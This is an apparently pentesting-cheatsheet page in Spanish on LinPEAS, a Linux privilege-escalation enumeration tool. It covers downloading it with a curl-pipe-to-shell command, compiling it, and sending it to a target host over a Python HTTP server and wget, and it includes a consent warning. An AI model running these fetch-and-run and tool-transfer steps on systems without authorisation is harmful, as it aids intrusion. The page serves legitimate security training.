
# Linpeas

También está disponible para Windows (<mark style="color:purple;">WinPEAS</mark>):

{% embed url="<https://github.com/carlospolop/PEASS-ng/tree/master>" %}

<figure><img src="/files/o4aItQsEO091FlsY1IZ0" alt=""><figcaption></figcaption></figure>

El script de LinPEAS está diseñado para ejecutarse en el sistema objetivo y generar un informe detallado que puede ser utilizado por los atacantes para identificar posibles vías de escalada de privilegios en el sistema Linux. LinPEAS también puede ser utilizado por los administradores de sistemas para identificar debilidades de seguridad y errores de configuración en sus sistemas y tomar medidas para corregirlos.

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a comprometer y escalar privilegios en un sistema, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Empleo</mark>

{% embed url="<https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS>" %}

## Con conectividad a internet

{% code title="Descargar y ejecutar" %}

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

{% endcode %}

{% code title="Ejecutar" %}

```bash
bash linpeas.sh
```

{% endcode %}

## Sin conectividad a internet

Si en nuestra máquina objetivo no tenemos conectividad a internet debemos descargarnos el binario y enviarlo a la máquina objetivo:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

O también podemos compilar el ejecutable:

{% hint style="success" %}
Esto por ejemplo nos permite crear una versión reducida de Linpeas para que cargue solamente los módulos que queramos con el parámetro `--small`
{% endhint %}

### Compilación del binario

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ git clone https://github.com/peass-ng/PEASS-ng.git
</strong>afsh4ck@kali$ cd PEASS-ng
</code></pre>

{% hint style="warning" %}
Necesitamos estar en el directorio raiz del repositorio clonado o no funcionará
{% endhint %}

```shell-session
afsh4ck@kali$ python3 -m linPEAS.builder.linpeas_builder --output linpeas.sh      

<----SIP---->

Build you own linpeas.sh

options:
  -h, --help            show this help message and exit
  --all                 Build linpeas with all modules (linpeas_fat).
  --all-no-fat          Build linpeas with all modules except fat ones.
  --no-network-scanning
                        Build linpeas without network scanning.
  --small               Build small version of linpeas.
  --include INCLUDE     Build linpeas only with the modules indicated you can indicate
                        section names or module IDs).
  --exclude EXCLUDE     Exclude the given modules (you can indicate section names or module
                        IDs).
  --output OUTPUT       Parth to write the final linpeas file to.
```

```shell-session
afsh4ck@kali$ python3 -m linPEAS.builder.linpeas_builder --output linpeas.sh --all

[+] Downloading regexes...
Downloaded and saved in '/home/kali/Escritorio/hack-tools/PRIVESC/PEASS-ng/build_lists/regexes.yaml' successfully!
[+] Checking the syntax of the modules...
[+] 156 checks located
[+] Building temporary linpeas_base.sh with the indicated modules...
[+] Building variables...
[+] Building finds...
[+] Building storages...
[+] Checking duplicates...
[+] Building autocheck sections...
[+] Building regexes searches...
[+] Downloading external tools...
Downloading https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh...
Downloading https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl...
Downloading https://github.com/genuinetools/amicontained/releases/latest/download/amicontained-linux-amd64...
Downloading https://github.com/gitleaks/gitleaks/releases/download/v8.17.0/gitleaks_8.17.0_darwin_arm64.tar.gz...
Downloading https://github.com/gitleaks/gitleaks/releases/download/v8.17.0/gitleaks_8.17.0_linux_x64.tar.gz...
[+] Building GTFOBins lists...
[+] Final sanity checks...
```

Si hacemos un `ls` veremos el binario compilado: `linpeas.sh`

```bash
ls

build_lists      LICENSE  linpeas.sh  parsers    TODO.md
CONTRIBUTING.md  linPEAS  metasploit  README.md  winPEAS
```

### Envio del binario a la máquina

Podemos utilizar cualquier técnica de la sección:

{% content-ref url="/pages/nidKxJlqN0jQ1pHco7Rc" %}
[File Transfers](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/file-transfers.md)
{% endcontent-ref %}

Lo más sencillo es abrir un servidor local con python y descargarlo en el objetivo con wget:

```bash
# En Kali Linux
python3 -m http.server 80

# En la máquina objetivo
wget http://10.10.10.10/linpeas.sh
```

<figure><img src="/files/K5aqG1c8zRxQVMyE8BTI" alt=""><figcaption></figcaption></figure>

### Ejecutar el binario

```bash
bash linpeas.sh
```

<figure><img src="/files/QaSPIwyPbOq6rcDLqD4B" alt=""><figcaption></figcaption></figure>
